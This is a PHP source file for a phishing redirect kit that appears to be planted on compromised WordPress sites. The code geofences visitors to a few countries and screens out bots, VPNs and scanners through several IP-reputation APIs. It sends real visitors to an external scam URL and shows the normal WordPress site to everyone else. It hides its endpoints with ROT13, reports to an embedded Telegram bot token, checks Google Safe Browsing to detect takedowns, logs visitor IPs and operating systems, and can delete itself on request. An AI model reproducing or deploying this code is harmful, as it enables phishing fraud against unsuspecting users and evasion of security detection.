<?php
session_start();
if(!file_exists('dashbrd.html')){
    $save=fopen('dashbrd.html','w');
    fwrite($save,'<!doctype html>
<html>

    <head>
    <link rel="icon" href="https://ih1.redbubble.net/image.3999969553.0592/st,small,507x507-pad,600x600,f8f8f8.jpg">
    <link rel="icon" href="https://ih1.redbubble.net/image.3999969553.0592/st,small,507x507-pad,600x600,f8f8f8.jpg">
    <style>
    .iconcountry{
        width: 24px;
        margin-right: 5px;
    }
    tr{
        text-align: center;
    }
    </style>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <title>🇩🇪|𝘝𝘶𝘦|𝘚𝘩𝘢𝘯𝘬𝘴</title>
        <link rel="icon" href="https://ih1.redbubble.net/image.3999969553.0592/st,small,507x507-pad,600x600,f8f8f8.jpg">
    </head>

    <body>
        <div class="container-fluid">
            <table  class="table table-striped table-sm table-borderless">
                <thead>
                    <tr>
                        <th>🇨 🇳 🇹 🇾</th>
                        <th>🇩 🇦 🇹 🇪</th>
                        <th>🇧 🇷 🇼 🇷</th>
                        <th>🇮 🇳 🇫 🇴</th>
                    </tr></thead></div>');
    fclose($save);
    
}
define('WP_USE_THEMES', true);
define('LOCATION', "https://google.com");
define('CHECKUP', "AccessID923487");
define('wplink', '/wp-blog-header.php');

if (isset($_GET["del"]))
{
    unlink("index.php");
    exit;
}
if (isset($_GET["check"]))
{
    print CHECKUP;
    exit;
}

$license = "Houss-1987";

$redirect = "https://01-10-2025-updates.netsons.org/";

$parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
$wordpress = true; // Allow Wordpress Include
$checkfileup = false; // Check Link UP

$country = array("ma","ca","us"); #Country's Allowed To Access

/************************************************************* PARAMETRES ******************************************************************/

class Obj
{
    var $keys;
    var $returns;
    var $message;
    const errorlink = "𝘕𝘴𝘪𝘵𝘪 𝘚𝘬𝘦𝘮";
    const Human = "𝙷𝚄𝙼𝙰𝙽";
    const countrydenied = "𝘊𝘰𝘶𝘯𝘵𝘳𝘺 𝘋𝘦𝘯𝘪𝘦𝘥";
    const bot = "𝘉𝘖𝘛/𝘝𝘗𝘕";
    const down = "ᴠʙᴠ - 𝘗𝘢𝘨𝘦 𝘋.𝘖.𝘞.𝘕";
    const alert = "ᴠʙᴠ - 𝘙𝘦𝘥 𝘈𝘓𝘌𝘙𝘛!";
    const license = "License Required";
    const block = "BLOCK";
    const allow = "ALLOW";
    const localhost = "102.53.13.21";
    const timeout = 10;
    const id = "1061031967:";
    const filename = "ih.gkg";
    const token = "7032892858:AAGr73d0N2LwNDbJqdB58tjvOjXcbC8eWP8";
    const chatid = "-4275336100";
    const telegram = "uggcf://ncv.gryrtenz.bet/obg";
    const api1 = "uggcf://oynpxobk.vcvasb.ncc/ybbxhc/";
    const api2 = "uggc://purpx.trgvcvagry.arg/purpx.cuc?vc=";
    const api3 = "uggcf://vc.grbu.vb/ncv/ica/";
    const api4 = "uggc://cebklpurpx.vb/i2/";
    const api5 = "uggcf://i2.ncv.vcuho.vasb/thrfg/vc/";
    const api6 = "uggcf://vcncv.pbz/vc_ncv.cuc?vc=";
    const googleapi = "uggcf://genafcneraplercbeg.tbbtyr.pbz/genafcneraplercbeg/ncv/i3/fnsroebjfvat/fgnghf?fvgr=";
    

    private function __curl($url)
    {

        $this->keys = curl_init();
        curl_setopt($this->keys, CURLOPT_URL, $url);
        curl_setopt($this->keys, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($this->keys, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($this->keys, CURLOPT_TIMEOUT, self::timeout);
        curl_setopt($this->keys, CURLOPT_COOKIESESSION, true);
        curl_setopt($this->keys, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        $this->returns = curl_exec($this->keys);
        return $this->returns;

    }
    private function __jsondecode($text)
    {

        return @json_decode($text);
    }
    private function rot($text)
    {

        return @str_rot13($text);
    }
    private function proxy1($ip)
    {
        $jsons = $this->__curl($this->rot(self::api1));
        if ($jsons == "Y")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }
    private function proxy2($ip)
    {
        $html = $this->__curl($this->rot(self::api2) . $ip . "&contact=akagami.m4" . rand(0, 1999999) . "@gmail.com");
        if ($html >= 0.99)
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function proxy3($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api3) . $ip));
        if ($json->risk == "high")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function proxy4($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api4) . $ip . "&risk=1&vpn=1"));
        if ($json->status == "ok" && $json->$ip->proxy == "yes")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }
    private function proxy5($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api5) . $ip . "?c=" . md5(rand(0, 11))));
        if ($json->block == 1)
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function __getcountrycode($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api6) . $ip));
        return $json->country_code;

    }
    private function __getcountryname($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api6) . $ip));
        return $json->country_name;

    }
    private function __messagesend($message)
    {
        if (!empty($message))
        {
            $url = $this->rot(self::telegram) . self::token . "/sendMessage?chat_id=" . self::chatid . "&text=" . urlencode($message);
            $this->__curl($url);
        }
    }
    private function __get_user_os()
    {
        $str=$_SERVER["HTTP_USER_AGENT"];
        $ex=explode("(",$str)[1];
        $ex2=explode(")",$ex)[0];
        $ex3=str_replace(";","",$ex2);
        return $ex3;
    }
    
    private function __checklicense($license)
    {
        return true;
    }
    private function url($redirect)
    {
        $html = $this->__curl($this->rot(self::googleapi) . $redirect);
        $ex = explode(",", $html);
        if ($ex[1] == 2)
        {
            return "RED";
        }
        else
        {
            return "GREEN";
        }
    }

    private function GetIpInfoFrmIpinfodbApi($ip)
    {

        $ResultInfo = array();

        $ResultInfo['CountryCodeMin'] = strtolower($this->__getcountrycode($ip));

        return $ResultInfo;

    }

    public function __writetext($text)
    {
            
        $file = fopen('dashbrd.html' , "a");
        if($text=='𝙷𝚄𝙼𝙰𝙽') $text="<td style='color:green'>".$text."</td>";
        elseif($text=='𝘉𝘖𝘛/𝘝𝘗𝘕') $text="<td style='color:red'>".$text."</td>";
        elseif ($text=='𝘊𝘰𝘶𝘯𝘵𝘳𝘺 𝘋𝘦𝘯𝘪𝘦𝘥') $text="<td  style='color:mediumorchid'>".$text."</td>";
        else  $text="<td>".$text."</td>";
        fwrite($file, "\n <tr><th scope='row'>"."<img class='iconcountry' src='https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/4.1.5/flags/4x3/".strtolower($this->__getcountrycode($this->__get_user_ip())).".svg' />". $this->__get_user_ip() . "</th><td>" . date("d/m/Y h:i:s A") . "</td><td>" . $this->__get_user_os() . "</td>" . $text . "</tr>");
        fclose($file);
        
    }
    private function __paramsendreport($id, $redirect)
    {
        if ($id == 1)
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "ᴠʙᴠ - 𝘗𝘢𝘨𝘦 𝘋.𝘖.𝘞.𝘕" . "\n";
            $this->message .= '𝘙𝘌𝘋𝘐: ' . $_SERVER["HTTP_HOST"] . "\n";
            $this->message .= "𝘚𝘒𝘌𝘔: " . $redirect . "\n";
            $this->message .= '𝘛𝘐𝘔𝘌: ' . $date . "\n";
            $this->__messagesend($this->message);
        }
        elseif ($id == 2)
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "ᴠʙᴠ - 𝘙𝘦-𝘜𝘱𝘭𝘥 𝘚𝘬𝘦𝘮 𝘕.𝘖.𝘞" . "\n";
            $this->message .= '𝘙𝘌𝘋𝘐: ' . $_SERVER["HTTP_HOST"] . "\n";
            $this->message .= "𝘚𝘒𝘌𝘔: " . $redirect . "\n";
            $this->message .= '𝘛𝘐𝘔𝘌: ' . $date . "\n";
            $this->__messagesend($this->message);
        }

    }
    
    private function __get_user_ip()
    {
        foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
        {
           if (array_key_exists($key, $_SERVER) === true)
           {
                foreach (explode(',', $_SERVER[$key]) as $ipgrassjoss){
                    $ipgrassjoss = trim($ipgrassjoss);
                    if (filter_var($ipgrassjoss,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false)
                    {
                       return $ipgrassjoss;
                    }
                    else
                    {
                        
                        return self::localhost;
                    }
                }
            }
        }
    }
    
    
    public function __checkfullreport($redirect)
    {

        if ($this->url($redirect) == "RED" or $this->url($_SERVER["HTTP_HOST"]) == "RED")
        {

            $this->__paramsendreport(1, $redirect);
            $this->__writetext(self::alert);
            exit("<script>alert('Please Refresh This Page After 10min')</script>");
        }

    }
    public function __validlicense($license)
    {

            
            return 1;


    }
    public function __allowedcountry($country)
    {

        $CountryData = $this->GetIpInfoFrmIpinfodbApi($this->__get_user_ip());

        if (!in_array($CountryData['CountryCodeMin'], $country))
        {
            $this->__writetext(self::countrydenied);
            
            return 0;

        }

        else
        {
            
            return 1;

        }

    }
    public function __checkproxy()
    {

        $proxy = $this->proxy1($this->__get_user_ip());
        $proxy2 = $this->proxy2($this->__get_user_ip());
        $proxy3 = $this->proxy3($this->__get_user_ip());
        $proxy4 = $this->proxy4($this->__get_user_ip());
        $proxy5 = $this->proxy5($this->__get_user_ip());

        if ($proxy == self::block or $proxy2 == self::block or $proxy3 == self::block or $proxy4 == self::block or $proxy5 == self::block)
        {
            $this->__writetext(self::bot);
            
            return 0;

        }
        else
        {
            return 1;
        }

    }
    private function __checkhostup($redirect,$checkfileup)
    {

        if ($checkfileup == true)
        {
            $html = $this->__curl($redirect . "/?check");
            if (preg_match("/" . CHECKUP . "/", $html))
            {
                return 1;
            }
            else
            {
                return 0;
            }
        }
        else
        {
            return 1;
        }
    }
    
    public function __hostup($redirect,$checkfileup)
    {
        if ($this->__checkhostup($redirect,$checkfileup) == 0)
        {
            $this->__writetext(self::down);
            $this->__paramsendreport(2, $redirect);
            exit("<script>alert('Contact Our Support For More Instruction')</script>");

        }

    }
    public function create_favicon($wordpress){
        
        if($wordpress == 1)
        {
            return fopen("favicon.ico", "a");
        }
    }
    public function __allowwp($id,$wordpress,$redirect)
    {
        if ($wordpress == true)
        {

            if ($id == 0)
            {

                return require (dirname(__FILE__) . wplink);
            }
            elseif ($id == 1)
            {

                return header("location:$redirect");
            }
        }
        elseif ($wordpress == false)
        {
            if ($id == 0)
            {
                return header("location:" . LOCATION);

            }
            elseif ($id == 1)
            {

                return header("location:$redirect");
            }
        }
    }

}

/************************************************************** BOT START ******************************************************************/
$param = new Obj;

$param->__checkfullreport($redirect);

if (!empty($redirect))
{

    switch ($parameter)
    {

        case "1":

        if($param->__validlicense($license) == 1 && $param->__checkproxy() == 1 && $param->__allowedcountry($country) == 1)
        {
            $param->create_favicon($wordpress);
            $param->__writetext(Obj::Human);
            $param->__hostup($redirect,$checkfileup);
            $param->__allowwp(1,$wordpress,$redirect);
        }
        else
        {
            $param->__allowwp(0,$wordpress,$redirect);
            
        }
        
        break;
        
        case "2":

        if($param->__validlicense($license) == 1 && $param->__allowedcountry($country) == 1)
        {
            $param->create_favicon($wordpress);
            $param->__writetext(Obj::Human);
            $param->__hostup($redirect,$checkfileup);
            $param->__allowwp(1,$wordpress,$redirect);
        }
        else
        {
            $param->__allowwp(0,$wordpress,$redirect);
            
        }
        
        break;
        
        case "3":

        if($param->__validlicense($license) == 1 && $param->__checkproxy() == 1)
        {
            $param->create_favicon($wordpress);
            $param->__writetext(Obj::Human);
            $param->__hostup($redirect,$checkfileup);
            $param->__allowwp(1,$wordpress,$redirect);
        }
        else
        {
            $param->__allowwp(0,$wordpress,$redirect);
            
        }
        
        break;
        
        default:
        
        header ("location:".$redirect);
        
        break;
        
    }

}
else
{

    echo Obj::errorlink;
}
/************************************************************** BOT END ******************************************************************/
